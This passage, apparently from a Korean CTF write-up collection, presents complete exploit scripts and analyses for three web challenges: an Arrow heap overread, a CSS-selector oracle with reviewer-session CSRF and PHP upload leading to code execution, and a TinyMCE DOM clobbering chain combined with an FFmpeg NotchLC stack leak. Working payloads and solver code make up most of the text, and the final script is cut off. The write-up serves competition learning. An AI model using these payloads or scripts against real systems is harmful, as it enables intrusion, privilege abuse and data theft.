    message_fields = flatbuffer_fields(metadata, root)
    if len(message_fields) <= 3 or message_fields[3] == 0:
        return 0
    return i64(metadata, root + message_fields[3])


def make_overread_arrow() -> tuple[bytes, dict[str, int]]:
    """Build one binary(64) row, then claim that 2048 rows exist."""
    arrow_type = pa.binary(64)
    schema = pa.schema([pa.field("measurement", arrow_type, nullable=False)])
    batch = pa.record_batch([pa.array([b"A" * 64], type=arrow_type)], schema=schema)
    sink = pa.BufferOutputStream()
    with ipc.new_file(sink, schema) as writer:
        writer.write_batch(batch)
    payload = bytearray(sink.getvalue().to_pybytes())

    cursor = 8
    messages: list[tuple[int, int, int]] = []
    while cursor + 8 <= len(payload) - 10:
        if u32(payload, cursor) != 0xFFFFFFFF:
            break
        metadata_length = u32(payload, cursor + 4)
        if metadata_length == 0:
            break
        metadata_start = cursor + 8
        metadata = payload[metadata_start : metadata_start + metadata_length]
        body_length = message_body_length(metadata)
        messages.append((metadata_start, metadata_length, body_length))
        cursor = metadata_start + align8(metadata_length) + align8(body_length)
    if len(messages) != 2:
        raise RuntimeError(f"unexpected Arrow message layout: {messages!r}")

    metadata_start, metadata_length, body_length = messages[1]
    metadata = payload[metadata_start : metadata_start + metadata_length]
    root = u32(metadata, 0)
    message_fields = flatbuffer_fields(metadata, root)
    header_field = root + message_fields[2]
    record_batch = header_field + u32(metadata, header_field)
    record_fields = flatbuffer_fields(metadata, record_batch)

    row_count_offset = metadata_start + record_batch + record_fields[0]
    nodes_field = record_batch + record_fields[1]
    nodes_vector = nodes_field + u32(metadata, nodes_field)
    node_length_offset = metadata_start + nodes_vector + 4
    if i64(payload, row_count_offset) != 1 or i64(payload, node_length_offset) != 1:
        raise RuntimeError("Arrow layout checks failed before mutation")
    struct.pack_into("<q", payload, row_count_offset, LEAK_ROWS)
    struct.pack_into("<q", payload, node_length_offset, LEAK_ROWS)

    return bytes(payload), {
        "file_bytes": len(payload),
        "metadata_start": metadata_start,
        "metadata_length": metadata_length,
        "body_length": body_length,
        "row_count_offset": row_count_offset,
        "node_length_offset": node_length_offset,
    }


def make_heap_groom_arrow() -> bytes:
    """Leave a mapped 128 KiB fixed-width value buffer in the parser heap."""
    arrow_type = pa.binary(64)
    schema = pa.schema([pa.field("measurement", arrow_type, nullable=False)])
    batch = pa.record_batch(
        [pa.array([b"G" * 64] * LEAK_ROWS, type=arrow_type)], schema=schema
    )
    sink = pa.BufferOutputStream()
    with ipc.new_file(sink, schema) as writer:
        writer.write_batch(batch)
    return sink.getvalue().to_pybytes()


def decode_leak(response_json: dict) -> bytes:
    rows = response_json.get("rows")
    if not isinstance(rows, list) or len(rows) != LEAK_ROWS:
        raise RuntimeError(f"expected {LEAK_ROWS} leaked rows, got {type(rows).__name__}")
    chunks: list[bytes] = []
    for row in rows:
        if not isinstance(row, list) or not row or not isinstance(row[0], str):
            raise RuntimeError("unexpected fixed-width binary JSON representation")
        chunks.append(b64url_decode(row[0]))
    return b"".join(chunks)


def bound_packets(raw: bytes, inspection_id: str, review_id: str) -> list[tuple[int, str, dict]]:
    found: list[tuple[int, str, dict]] = []
    seen: set[str] = set()
    for match in PACKET_RE.finditer(raw):
        token = match.group(0).decode()
        if token in seen:
            continue
        seen.add(token)
        try:
            document = json.loads(b64url_decode(match.group(1).decode()))
        except (ValueError, UnicodeDecodeError, json.JSONDecodeError):
            continue
        if (
            document.get("inspection_id") == inspection_id
            and document.get("review_id") == review_id
            and document.get("kind") == "conformance_decision_packet"
            and document.get("outcome") == "PASS"
        ):
            found.append((match.start(), token, document))
    return found


def recover_packet(
    base: str, session: requests.Session, inspection_id: str, review_id: str
) -> tuple[str, dict, dict]:
    payload, layout = make_overread_arrow()
    groom_payload = make_heap_groom_arrow()
    print(f"[+] malformed Arrow layout: {json.dumps(layout, separators=(',', ':'))}", flush=True)

    # One valid fixed-width batch maps a 128 KiB arena before the malformed
    # read.  It consumes a queue slot, so groom only once: after the PASS
    # workbook there is room for this allocation and at most two leak reads.
    groom = require(
        session.post(
            base + "/qa/workbooks/preview",
            data=groom_payload,
            headers={
                "Content-Type": "application/octet-stream",
                "Accept": "application/json",
            },
            timeout=50,
        ),
        "heap groom workbook",
    )
    print(f"[+] heap groom accepted: HTTP {groom.status_code}", flush=True)

    for attempt in range(1, 3):
        response = session.post(
            base + "/qa/workbooks/preview",
            data=payload,
            headers={
                "Content-Type": "application/octet-stream",
                "Accept": "application/json",
            },
            timeout=50,
        )
        if response.status_code >= 400:
            print(
                f"[-] workbook leak attempt {attempt}: HTTP {response.status_code}: "
                f"{response.text[:200]}",
                flush=True,
            )
            time.sleep(0.25)
            continue
        parsed = response.json()
        raw = decode_leak(parsed)
        candidates = bound_packets(raw, inspection_id, review_id)
        print(
            f"[+] leak attempt {attempt}: {len(raw)} bytes, "
            f"{len(PACKET_RE.findall(raw))} signed-looking values, "
            f"{len(candidates)} bound packet(s)",
            flush=True,
        )
        if candidates:
            offset, token, document = max(
                candidates, key=lambda item: int(item[2].get("issued_at", 0))
            )
            print(f"[+] selected packet at leak offset 0x{offset:x}: {json.dumps(document)}", flush=True)
            return token, document, layout
        time.sleep(0.25)
    raise RuntimeError("the four-entry queue filled without leaking the primed PASS packet")


def submit_and_get_flag(
    base: str, session: requests.Session, packet: str
) -> tuple[dict, list[str]]:
    response = session.post(
        base + "/qa/decision-packets/submit",
        json={"packet": packet},
        headers={"Accept": "application/json"},
        timeout=30,
    )
    try:
        submitted = response.json()
    except ValueError as error:
        raise RuntimeError(f"packet submit returned non-JSON HTTP {response.status_code}") from error
    if response.status_code not in {200, 409}:
        raise RuntimeError(f"packet submit: HTTP {response.status_code}: {submitted!r}")
    if submitted.get("record_state") not in {"decision_packet_recorded", "unchanged"}:
        raise RuntimeError(f"unexpected submit result: {submitted!r}")
    print(f"[+] packet submitted: {json.dumps(submitted, separators=(',', ':'))}", flush=True)

    flags: set[str] = set()
    for _ in range(20):
        for path in ("/dashboard", "/qa/workspace", "/conformance"):
            page = require(session.get(base + path, timeout=20), path).text
            flags.update(FLAG_RE.findall(page))
        if flags:
            break
        time.sleep(0.25)
    return submitted, sorted(flags)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default=DEFAULT_BASE)
    parser.add_argument("--timeout", type=float, default=20.0)
    args = parser.parse_args()
    base = args.base.rstrip("/")

    session = requests.Session()
    session.headers["User-Agent"] = "UHCON-BIS-solver/1.0"
    try:
        username, password = register(base, session)
        inspection_id = create_failed_inspection(base, session)
        review_id = gain_reviewer_assist(base, session, inspection_id)
        principal = Principal(username, password, inspection_id, review_id)
        print(
            f"[+] principal: {json.dumps({'username': username, 'inspection_id': inspection_id, 'review_id': review_id})}",
            flush=True,
        )

        pass_preview = prime_pass_packet(base, session, inspection_id)
        packet, packet_document, layout = recover_packet(
            base, session, inspection_id, review_id
        )
        submitted, flags = submit_and_get_flag(base, session, packet)
        result = {
            "account": {
                "username": principal.username,
                "inspection_id": principal.inspection_id,
                "review_id": principal.review_id,
            },
            "pass_preview": pass_preview,
            "arrow_layout": layout,
            "packet_document": packet_document,
            "submit": submitted,
            "flags": flags,
        }
        print(json.dumps(result, ensure_ascii=False, indent=2), flush=True)
        if not flags:
            print("[-] packet recorded but no flag was rendered", file=sys.stderr)
            return 2
        for flag in flags:
            print(f"FLAG: {flag}")
        return 0
    except (requests.RequestException, KeyError, RuntimeError, ValueError) as error:
        print(f"[-] {type(error).__name__}: {error}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
````

---

## 6. KSMC

### 결과

- 분야: Web
- 대상: `http://43.203.187.25:8080` / `http://54.116.218.21:8080`
- CTFd challenge ID: 6
- 제출 상태: `solved_by_me: true` (`already_solved` 재확인)

```text
FLAG{bcf1b18e111d5df1c2d90137a8a0c6b22c023b860471840468df113ba78b2043}
```

최종 체인은 다음과 같다.

```text
stored CSS
  → reviewer DOM의 템플릿별 ctx/chn 값 추출
  → reviewer 세션으로 내부 승인 GET 유도
  → approved receipt 획득
  → ZIP 안의 .php 업로드
  → PHP-enabled publication 경로에서 실행
  → /flag 읽기
```

### 1. 사용자 기능과 신뢰 경계

로그인 사용자는 출력 서식과 브랜딩 패키지를 관리할 수 있다.

1. `POST /api/v1/print-templates`로 이름과 CSS를 저장한다.
2. `POST /api/v1/print-templates/{id}/submit`으로 내부 검토를 요청한다.
3. 승인된 서식은 `capability.receipt`를 받는다.
4. `POST /api/v1/brand-packages/import`에 서식 UUID, receipt, ZIP을 multipart로 전송한다.
5. 배포된 파일은 `/runtime/brand-packages/{package-id}/` 아래에서 제공된다.

서식 API 응답의 `Link` 헤더에는 사용자에게 직접 허용되지 않는 내부 상태 변경 URL이 노출되어 있었다.

```text
/internal/template-reviews/{template-id}/decision
    ?state=approved&scope=brand-publisher
```

일반 로그인 세션에서 이 URL을 직접 요청하면 403이다. 그러나 검토 렌더러는 별도 privileged 세션으로 같은 origin의 subresource를 가져온다.

### 2. Stored CSS와 reviewer DOM

사용자 CSS는 검토 preview의 `<style>`에 그대로 들어가며 CSP는 inline style과 same-origin image를 허용한다.

```text
default-src 'none'
style-src 'unsafe-inline'
img-src 'self' data:
```

내부 검토 시 `#branding-policy`에는 공개 preview와 다른 두 속성이 생긴다.

```html
<section id="branding-policy"
  data-review-context="ctx-<16 lowercase-alphanumeric>"
  data-channel="chn-<16 lowercase-alphanumeric>">
```

값은 template UUID마다 다르지만 같은 거절 서식을 `PATCH → submit`하여 다시 심사하면 바뀌지 않는다. 따라서 하나의 UUID를 독점해 반복 심사하면 전체 값을 복구할 수 있다.

### 3. CSS selector oracle로 ctx/chn 복구

각 위치에서 `a-z0-9` 후보 36개를 두 속성에 동시에 검사했다. 일치한 selector만 challenge가 제공하는 probe URL을 이미지로 요청한다.

```css
#branding-policy[data-review-context^="ctx-ab"] {
  background-image: url("/api/v1/print-templates/UUID/probes/r3x1") !important;
}

#branding-policy[data-channel^="chn-xy"]::after {
  display: block !important;
  content: url("/api/v1/print-templates/UUID/probes/c3x24") !important;
}
```

심사가 끝난 뒤 template API의 `probes` 배열에서 발화한 label을 읽으면 다음 문자를 알 수 있다. ctx와 chn을 한 CSS에 넣어 16회의 재심사로 두 16자 suffix를 함께 복구했다. 최대 payload도 20,000자 CSS 제한 안에 들어간다.

다른 template에서 얻은 접두사를 이어 붙이면 안 된다. 초기에 관측된 `ctx-p`, `chn-t` 같은 짧은 값은 매 문자마다 새 UUID를 만든 잘못된 추론이었다. 동일 UUID 재심사와 마지막 exact selector 확인이 핵심이다.

### 4. Reviewer 세션으로 승인 요청

서버의 승인 gate는 임의 query/header 토큰을 검사하지 않았다. 같은 template의 probe log에 정확한 ctx와 chn 값이 모두 기록됐는지를 확인하고, decision 요청이 reviewer 렌더러 세션에서 왔을 때만 통과했다.

정확한 두 값을 동시에 만족하는 selector에서 먼저 두 값을 probe label로 기록하고, 1.5초 뒤 내부 decision URL을 image로 요청했다.

```css
#branding-policy[data-review-context="CTX"][data-channel="CHN"]::before {
  display: block !important;
  content: url("/api/v1/print-templates/UUID/probes/CTX") !important;
}

#branding-policy[data-review-context="CTX"][data-channel="CHN"]::after {
  display: block !important;
  content: url("/api/v1/print-templates/UUID/probes/CHN") !important;
}

@keyframes approve-late {
  0%, 70% { background-image: none }
  100% {
    background-image: url("/internal/template-reviews/UUID/decision?state=approved&scope=brand-publisher")
  }
}

#branding-policy[data-review-context="CTX"][data-channel="CHN"] {
  animation: approve-late 1.5s steps(1,end) 1 forwards !important;
}
```

리뷰 renderer가 같은 origin 요청에 privileged cookie를 자동 전파하므로 상태가 `approved`로 바뀌고 다음 capability가 반환된다.

```json
{
  "profile": "brand-archive",
  "receipt": "<opaque receipt>",
  "import": "/api/v1/brand-packages/import"
}
```

### 5. ZIP importer의 실행 확장자 검증 누락

처음에는 path traversal, central/local filename mismatch, symlink, manifest type confusion을 검사했다. 이 우회들은 필요하지 않았다.

정상 `manifest.json`과 `flag.php` 두 파일만 든 ZIP이 HTTP 201로 배포됐다.

```php
<?php
header('Content-Type: text/plain');
echo file_get_contents('/flag');
?>
```

importer는 `.php`를 거부하지 않고, 반환된 `asset_base`는 PHP가 활성화된 Apache publication tree를 가리킨다.

```text
GET /runtime/brand-packages/{package-id}/flag.php
```

요청 결과 PHP 소스가 아니라 실행 결과가 반환되었고 `/flag`에서 플래그를 읽었다. root-level `flag.php`와 `assets/flag.php` 모두 실행되는 것을 독립적으로 확인했다.

### 6. 재현

필요 패키지는 `requests`와 `beautifulsoup4`다. 기존 기관 계정을 JSON으로 전달하거나 이메일/비밀번호를 직접 지정한다.

```bash
python solve.py --account root_account.json

# 또는
python solve.py --email USER@example.com --password 'PASSWORD'

# 두 번째 mirror
python solve.py --base http://54.116.218.21:8080 --account root_account.json
```

`solve.py`는 새 template을 만든 뒤 다음 과정을 자동화한다.

1. 같은 UUID를 16회 재심사하여 ctx와 chn을 함께 복구한다.
2. probe 두 개와 delayed decision 요청으로 승인을 얻는다.
3. receipt와 PHP ZIP을 importer에 보낸다.
4. `asset_base/flag.php`를 요청해 플래그를 추출한다.
5. `solve_result.json`과 `flag.txt`를 저장한다.

### 7. 확인한 음성 결과

- 일반 사용자 세션에서 decision URL 직접 GET: 403
- ctx/chn을 query나 custom header로 전달: 승인 실패
- ZIP central/local 이름 불일치: central directory의 안전한 이름으로 추출
- ZIP symlink: 링크를 역참조하지 않고 target 문자열을 일반 파일로 저장
- multipart duplicate scalar: 마지막 값 사용, 배열형은 Laravel validation 실패
- 승인 template의 package 재사용: 409; solver는 항상 새 template을 생성

두 mirror의 공개 JavaScript와 API 문서는 바이트 단위로 같았지만 DB와 배포 storage namespace는 분리되어 있었다. 첫 번째 mirror의 template/package UUID를 두 번째 mirror에서 조회하면 404였고, 반대 방향도 같았다. 따라서 한 mirror에서 복구한 ctx/chn, receipt, template UUID를 다른 mirror로 넘기는 방식은 성립하지 않는다. `solve.py --base`로 선택한 한 mirror 안에서 전 과정을 끝내야 한다.

### 8. 근본 원인

하나의 단일 버그가 아니라 다음 신뢰 경계 실패가 연결되었다.

- 공격자 CSS가 privileged reviewer 페이지에 저장·렌더링됨
- reviewer 전용 capability 값이 CSS selector로 관측 가능함
- 상태 변경이 same-origin image로 호출 가능한 GET endpoint임
- reviewer cookie가 CSS subresource 요청에 자동 전파됨
- probe log를 승인 증거로 신뢰함
- ZIP importer가 실행 확장자를 차단하지 않음
- 배포 디렉터리에서 PHP 실행이 활성화됨

### 증거 파일

- `root_same_template_recover_result.json`: 동일 UUID의 ctx/chn 16자 완전 복원
- `metrics_ksmc_handshake_minimal_result.json`: exact probe handshake와 receipt
- `d12_php_import_result.json`: PHP 실행 및 `/flag` 응답
- `ksmc_zip_path_php_rce_result.json`: 독립 PHP 실행 재현
- `ksmc_confusion_findings.md`: 불필요했던 ZIP 혼동 후보 정리
- `flag.txt`: 최종 플래그


### 9. 최종 풀이 코드 전체

아래 코드는 최종 재현 스크립트 전체다. 로그인 자격 증명 값은 포함하지 않고 실행 시 `root_account.json` 또는 명령행 인자로 받는다.

#### `solve.py`

````python
#!/usr/bin/env python3
"""End-to-end solver for UHCON KSMC.

Recover the per-template reviewer attributes with a stored-CSS oracle, obtain
an approved package receipt, upload a PHP asset, and read /flag.
"""

from __future__ import annotations

import argparse
import io
import json
from pathlib import Path
import re
import string
import time
import zipfile

import requests
from bs4 import BeautifulSoup


DEFAULT_BASE = "http://43.203.187.25:8080"
ALPHABET = string.ascii_lowercase + string.digits
ACTIVE = {"draft", "pending", "queued", "reviewing"}
FLAG_RE = re.compile(r"(?:FLAG|UHCON|CTF)\{[^}\r\n]+\}", re.I)


def load_account(path: Path, email: str | None, password: str | None) -> tuple[str, str]:
    if email and password:
        return email, password
    account = json.loads(path.read_text(encoding="utf-8"))
    return account["email"], account["password"]


def login(base: str, email: str, password: str) -> requests.Session:
    session = requests.Session()
    page = session.get(base + "/login", timeout=20)
    page.raise_for_status()
    token = BeautifulSoup(page.text, "html.parser").select_one(
        'input[name="_token"]'
    )["value"]
    response = session.post(
        base + "/login",
        data={"_token": token, "email": email, "password": password},
        timeout=20,
    )
    response.raise_for_status()
    if "/login" in response.url:
        raise RuntimeError("login failed")
    return session


def poll_terminal(session: requests.Session, base: str, template_id: str) -> dict:
    url = base + f"/api/v1/print-templates/{template_id}"
    deadline = time.monotonic() + 20
    state: dict = {}
    while time.monotonic() < deadline:
        time.sleep(0.15)
        response = session.get(url, headers={"Accept": "application/json"}, timeout=20)
        response.raise_for_status()
        state = response.json()
        if state.get("state") not in ACTIVE:
            return state
    raise RuntimeError(f"review did not finish: {state}")


def review(
    session: requests.Session,
    base: str,
    template_id: str,
    name: str,
    css: str,
) -> dict:
    headers = {"Accept": "application/json", "Content-Type": "application/json"}
    url = base + f"/api/v1/print-templates/{template_id}"
    patched = session.patch(
        url, headers=headers, json={"name": name, "css": css}, timeout=20
    )
    patched.raise_for_status()
    submitted = session.post(url + "/submit", headers=headers, json={}, timeout=20)
    submitted.raise_for_status()
    return poll_terminal(session, base, template_id)


def recover_reviewer_values(
    session: requests.Session, base: str, template_id: str
) -> tuple[str, str, list[dict]]:
    context = "ctx-"
    channel = "chn-"
    history: list[dict] = []
    probe_base = f"/api/v1/print-templates/{template_id}/probes"

    for position in range(16):
        rules: list[str] = []
        context_labels: dict[str, str] = {}
        channel_labels: dict[str, str] = {}
        for index, char in enumerate(ALPHABET):
            rlabel = f"r{position}x{index}"
            clabel = f"c{position}x{index}"
            context_labels[rlabel] = char
            channel_labels[clabel] = char
            rules.append(
                f'#branding-policy[data-review-context^="{context + char}"]'
                f'{{background-image:url("{probe_base}/{rlabel}")!important}}'
            )
            rules.append(
                f'#branding-policy[data-channel^="{channel + char}"]::after'
                f'{{display:block!important;content:url("{probe_base}/{clabel}")!important}}'
            )
        css = "".join(rules)
        if len(css) > 20_000:
            raise RuntimeError(f"CSS limit exceeded at position {position}")
        state = review(
            session, base, template_id, f"KSMC token recovery {position}", css
        )
        probes = state.get("probes", [])
        r_hit = next((label for label in probes if label in context_labels), None)
        c_hit = next((label for label in probes if label in channel_labels), None)
        if not r_hit or not c_hit:
            raise RuntimeError(f"token recovery failed at position {position}: {probes}")
        context += context_labels[r_hit]
        channel += channel_labels[c_hit]
        row = {
            "position": position,
            "review_context": context,
            "channel": channel,
            "probes": probes,
        }
        history.append(row)
        print(json.dumps(row, ensure_ascii=False), flush=True)
    return context, channel, history


def approve(
    session: requests.Session,
    base: str,
    template_id: str,
    context: str,
    channel: str,
) -> dict:
    selector = (
        f'#branding-policy[data-review-context="{context}"]'
        f'[data-channel="{channel}"]'
    )
    probe = f"/api/v1/print-templates/{template_id}/probes"
    state: dict = {}
    for attempt in range(3):
        delay = 1.5 + attempt * 0.75
        decision = (
            f"/internal/template-reviews/{template_id}/decision"
            f"?state=approved&scope=brand-publisher&nonce={time.time_ns()}"
        )
        css = "\n".join(
            [
                f'{selector}::before{{display:block!important;content:url("{probe}/{context}")!important}}',
                f'{selector}::after{{display:block!important;content:url("{probe}/{channel}")!important}}',
                "@keyframes approve-late{0%,70%{background-image:none}"
                f'100%{{background-image:image-set(url("{decision}") 1x)}}}}',
                f"{selector}{{animation:approve-late {delay}s steps(1,end) 1 forwards!important}}",
            ]
        )
        state = review(
            session,
            base,
            template_id,
            f"KSMC exact reviewer handshake {attempt}",
            css,
        )
        if state.get("state") == "approved" and (state.get("capability") or {}).get(
            "receipt"
        ):
            return state
    raise RuntimeError(f"approval failed after retries: {state}")


def php_archive() -> bytes:
    php = """<?php
header('Content-Type: text/plain');
$v = @file_get_contents('/flag');
if ($v !== false) echo $v;
?>
"""
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(
            "manifest.json",
            json.dumps({"name": "KSMC brand assets", "version": "1.0.0"}),
        )
        archive.writestr("flag.php", php)
    return stream.getvalue()


def main() -> None:
    root = Path(__file__).resolve().parent
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base", default=DEFAULT_BASE)
    parser.add_argument("--account", type=Path, default=root / "root_account.json")
    parser.add_argument("--email")
    parser.add_argument("--password")
    parser.add_argument("--result", type=Path, default=root / "solve_result.json")
    args = parser.parse_args()

    email, password = load_account(args.account, args.email, args.password)
    session = login(args.base.rstrip("/"), email, password)
    base = args.base.rstrip("/")
    headers = {"Accept": "application/json", "Content-Type": "application/json"}
    created = session.post(
        base + "/api/v1/print-templates",
        headers=headers,
        json={"name": "KSMC end-to-end solver", "css": "x{}"},
        timeout=20,
    )
    created.raise_for_status()
    template_id = created.json()["id"]

    context, channel, recovery = recover_reviewer_values(
        session, base, template_id
    )
    approved = approve(session, base, template_id, context, channel)
    receipt = approved["capability"]["receipt"]
    imported = session.post(
        base + "/api/v1/brand-packages/import",
        data={"template_id": template_id, "review_receipt": receipt},
        files={"archive": ("brand.zip", php_archive(), "application/zip")},
        headers={"Accept": "application/json"},
        timeout=30,
    )
    imported.raise_for_status()
    package = imported.json()
    runtime_url = base + package["asset_base"].rstrip("/") + "/flag.php"
    response = session.get(runtime_url, timeout=20)
    response.raise_for_status()
    match = FLAG_RE.search(response.text)
    if not match:
        raise RuntimeError(f"PHP executed but no flag was returned: {response.text[:1000]}")
    flag = match.group(0)

    result = {
        "template_id": template_id,
        "review_context": context,
        "channel": channel,
        "recovery": recovery,
        "approval": approved,
        "package": package,
        "runtime_url": runtime_url,
        "flag": flag,
    }
    args.result.write_text(
        json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    (root / "flag.txt").write_text(flag + "\n", encoding="utf-8")
    print(f"[+] {flag}")


if __name__ == "__main__":
    main()
````

---

## 7. Media Approval

### 결과

- 대상: `http://43.203.139.141:8000` / `http://3.38.217.83:8000`
- CTFd challenge id: `3`
- 플래그: `FLAG{m3d14_92b89d0bc30f58eac14f7ea5f4b3e5845f090689}`
- 제출 결과: `already_solved` 재확인, `solved_by_me=true`

재현 스크립트는 `solve.py`이며 다음 명령으로 가입부터 플래그 복구까지 전 과정을 실행한다.

```powershell
python solve.py --target http://43.203.139.141:8000
```

이미 생성된 `solve-state.json` 계정을 재사용하려면 다음과 같이 실행한다.

```powershell
python solve.py --reuse
```

### 1단계: 리뷰 봇의 승인 권한 획득

일반 계정은 `delivery_contact`로 생성되고 `/compare`에 접근할 수 없다. `preview` 요청이 매니저에게 승인되면 `requests.py`의 `/manager/action`이 계정을 `associate_screens_producer`로 승격하고 `previews=Allowed`를 설정한다.

리뷰 봇은 공격자가 등록한 전송 위치를 방문한 뒤, 공격자의 요청만 볼 수 있는 scoped manager 세션으로 `/manager?request=<id>`를 연다. 이어 답변 textarea를 focus하여 TinyMCE를 자동으로 로드한다.

서버는 delivery note를 escape하지만 `static/js/app.js`가 다음과 같이 다시 HTML로 해석한다.

```javascript
const source = note.textContent;
note.setHTML(source, { sanitizer });
```

Sanitizer 설정은 `a` 요소와 `id`, `name`, `href`를 남긴다. 다음 note는 named-property 규칙으로 `window.tinymce`를 `HTMLCollection`으로 만들고 `baseURL` 속성을 공격자 지정 anchor로 만든다.

```html
<a id="tinymce"></a>
<a id="tinymce" name="baseURL" href="data:text/javascript,..."></a>
```

TinyMCE 8.9.2는 초기화 시 기존 `window.tinymce.baseURL`을 신뢰한다. `app.js`는 nonce가 있는 trusted script이고 페이지 CSP는 `strict-dynamic`을 사용하므로, TinyMCE가 위 base URL에서 동적으로 추가한 payload도 실행된다. payload는 현재 카드의 폼을 same-origin으로 전송한다.

```javascript
f = document.querySelector('form[action="/manager/action"]');
d = new FormData(f);
d.set('decision', 'approve');
fetch(f.action, { method: 'POST', body: d });
```

scoped manager 쿠키가 자동으로 붙으므로 해당 preview 요청이 승인되고 공격자 계정에 `/compare` 권한이 생긴다.

### 2단계: NotchLC stale-stack disclosure

`mediaops.approved_version()`은 실행 시 플래그를 승인 영상의 NotchLC 프레임 안에 넣는다. 제공된 샘플에서 프레임은 다음 형태다.

- LZ4 decompressed size: `380`
- compressed payload: `f0 ff 6e` + 380바이트 literal
- 플래그 시작 위치: decompressed history offset `300`

`/compare`는 같은 작업 흐름에서 승인 영상을 먼저 디코드하고, 곧바로 공격자가 업로드한 영상을 디코드한다.

FFmpeg 8.0.1의 `libavcodec/notchlc.c`에 있는 자체 LZ4 디코더는 다음 스택 배열을 초기화하지 않는다.

```c
uint8_t history[64 * 1024];
```

그리고 출력 위치보다 큰 distance를 허용하면서 참조 위치를 다음처럼 wrap한다.

```c
reference_pos = HISTORY_SIZE + pos - delta;
```

두 디코드 호출에서 동일한 worker stack이 재사용되므로 두 번째 호출의 `history`에는 첫 번째 승인 프레임이 남는다.

악성 프레임은 먼저 정상 NotchLC 헤더·control word를 포함한 252바이트를 literal로 출력한다. 이어 `delta=0xffd0`인 match를 넣는다.

```text
reference_pos = 65536 + 252 - 0xffd0 = 300
```

따라서 이전 승인 프레임의 `history[300:]`, 즉 플래그가 두 번째 프레임의 Y bitstream 위치로 복사된다. match 길이는 128바이트로 잡아 전체 decompressed size를 원본과 같은 380바이트로 맞췄다.

서버는 공격 영상의 luma를 `/compare/still?id=<job>`에 16-bit grayscale PNG로 저장한다. PNG 픽셀을 NotchLC의 4×4 block 소비 순서로 되돌리고, 각 값을 `0x1111` 단위 nibble로 양자화한 뒤 low nibble을 먼저 결합하면 stale history 원문이 복구된다.

```text
FLAG{m3d14_92b89d0bc30f58eac14f7ea5f4b3e5845f090689}
```

`solve.py`는 악성 MOV 생성, 업로드, compare 실행, PNG 다운로드, PNG filter 해제, NotchLC nibble 역변환, `FLAG{...}` 추출까지 자동화한다. 결과는 `flag.txt`와 `solve-state.json`에도 저장된다.


### 최종 풀이 코드 전체

아래 코드는 DOM clobbering 승인 요청, 악성 NotchLC MOV 생성, still PNG 역변환과 플래그 추출을 모두 포함한 최종 재현 스크립트 전체다. 저장된 계정 값·쿠키는 포함하지 않는다.

#### `solve.py`

````python
#!/usr/bin/env python3
"""End-to-end solver for UHCON Media Approval.

Stage 1 turns the reviewer's Sanitizer/TinyMCE DOM clobber into a scoped
manager approval.  Stage 2 exploits FFmpeg 8.0.1's uninitialised NotchLC LZ4
history and decodes the approved video's flag from the generated still PNG.
"""

from __future__ import annotations

import argparse
import json
import secrets
import struct
import time
import zlib
from pathlib import Path
from urllib.parse import quote

import requests


ROOT = Path(__file__).resolve().parent
STATE_PATH = ROOT / "solve-state.json"
SAMPLE_MOV = ROOT / "src" / "show" / "current.mov"


def reviewer_payload() -> str:
    # TinyMCE reads window.tinymce before replacing it with its real API.
    # Duplicate named anchors turn that value into an HTMLCollection whose
    # baseURL member is our second anchor.  TinyMCE then dynamically loads this
    # data URL as a trusted script under the page's strict-dynamic CSP.
    js = (
        "f=document.querySelector('form[action=\"/manager/action\"]');"
        "d=new FormData(f);d.set('decision','approve');"
        "fetch(f.action,{method:'POST',body:d})//"
    )
    data_url = "data:text/javascript," + quote(js, safe="(),.;=/:{}[]")
    return (
        '<a id="tinymce"></a>'
        f'<a id="tinymce" name="baseURL" href="{data_url}"></a>'
    )


def checked(response: requests.Response, expected=(200, 303)) -> requests.Response:
    if response.status_code not in expected:
        raise RuntimeError(
            f"{response.request.method} {response.url}: {response.status_code}\n"
            f"{response.text[:1000]}"
        )
    return response


def bootstrap(target: str) -> tuple[requests.Session, dict]:
    session = requests.Session()
    session.headers["User-Agent"] = "UHCON-Media-Approval-solver"
    token = secrets.token_hex(6)
    state = {
        "target": target.rstrip("/"),
        "email": f"solver-{token}@example.com",
        "password": "MediaApproval!" + secrets.token_hex(10),
    }

    response = session.post(
        state["target"] + "/signup",
        data={"email": state["email"], "password": state["password"]},
        allow_redirects=False,
        timeout=30,
    )
    checked(response)

    response = session.post(
        state["target"] + "/deliveries/new",
        data={"name": "reviewclip", "version": "v001"},
        files={"media": ("reviewclip.mov", SAMPLE_MOV.read_bytes(), "video/quicktime")},
        allow_redirects=False,
        timeout=30,
    )
    checked(response)
    location = response.headers.get("Location", "")
    state["delivery"] = int(location.rsplit("=", 1)[1])

    checked(
        session.post(
            state["target"] + "/requests/new",
            data={
                "delivery": str(state["delivery"]),
                "kind": "preview",
                "note": "Please approve the on-site preview.",
            },
            allow_redirects=False,
            timeout=30,
        )
    )

    checked(
        session.post(
            state["target"] + "/transfer",
            data={
                "delivery": str(state["delivery"]),
                "location": "http://app:8000/",
                "note": reviewer_payload(),
            },
            allow_redirects=False,
            timeout=30,
        )
    )
    STATE_PATH.write_text(json.dumps(state, indent=2), encoding="utf-8")
    return session, state


def wait_for_producer(session: requests.Session, state: dict, timeout: int = 120) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        response = session.get(state["target"] + "/show", timeout=20)
        if response.status_code == 200 and "접근 권한이 없습니다" not in response.text:
            state["producer"] = True
            STATE_PATH.write_text(json.dumps(state, indent=2), encoding="utf-8")
            print("[+] reviewer approved preview; producer access granted")
            return
        time.sleep(1)
    raise TimeoutError("reviewer did not grant producer access")


def login(state: dict) -> requests.Session:
    session = requests.Session()
    session.headers["User-Agent"] = "UHCON-Media-Approval-solver"
    checked(
        session.post(
            state["target"] + "/login",
            data={"email": state["email"], "password": state["password"]},
            allow_redirects=False,
            timeout=30,
        )
    )
    return session


def build_history_leak_mov() -> bytes:
    """Build a NotchLC frame that copies stale decoder stack bytes into Y.

    FFmpeg 8.0.1's NotchLC LZ4 decoder left its 64 KiB history array
    uninitialized.  The approved frame is decoded immediately before ours on
    the same worker thread, so history[300:] still contains the injected flag.
    We emit 252 literal bytes and then wrap a back-reference to old offset 300.
    """
    original = SAMPLE_MOV.read_bytes()
    marker = original.index(b"1CLN")
    uncompressed_size, stored, compression = struct.unpack_from("<III", original, marker + 4)
